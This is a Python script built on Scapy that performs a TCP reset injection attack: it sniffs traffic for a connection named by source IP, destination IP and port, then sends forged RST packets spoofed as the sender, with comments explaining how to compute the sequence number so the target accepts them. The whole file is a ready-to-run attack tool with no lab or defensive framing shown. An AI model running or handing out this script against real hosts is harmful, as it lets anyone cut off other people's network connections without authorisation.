from scapy.all import *
from sys import argv

def tcp_reset(src_ip, dst_ip, dst_port):
    conf.verb = 0
    # only handle packets of the targeted connection
    pkt_filter = f"tcp and host {src_ip} and host {dst_ip} and port {dst_port}"

    # per packet callback
    def pkt_handle(pkt):
        ip, tcp = pkt[IP], pkt[TCP]

        # flags FIN (0x01), SYN (0x02), RST (0x04)
        # Ignore RSTs (including our own)
        if tcp.flags & 0x04:
            return

        # S (current sequence number) + L (payload bytes) (+1 if that segment also has SYN or FIN) is the formula that gives the next
        # sequence number, needed so that our forged RST is accepted
        consumed = len(tcp.payload)
        if tcp.flags & 0x02:
            consumed += 1
        if tcp.flags & 0x01:
            consumed += 1

        # forging the RST, spoofed as the sender, with the proper future sequence number
        rst = IP(src=ip.src, dst=ip.dst) / \
            TCP(sport=tcp.sport, dport=tcp.dport, flags="R", seq=tcp.seq+consumed)
        send(rst)

    sniff(filter=pkt_filter, prn=pkt_handle, store=0)

if __name__ == "__main__":
    if len(argv) != 4:
        print(f"Usage: python3 {argv[0]} <source_ip> <destination_ip> <destination_port>")
        exit(1)

    src_ip, dst_ip, dst_port = argv[1], argv[2], int(argv[3])
    tcp_reset(src_ip, dst_ip, dst_port)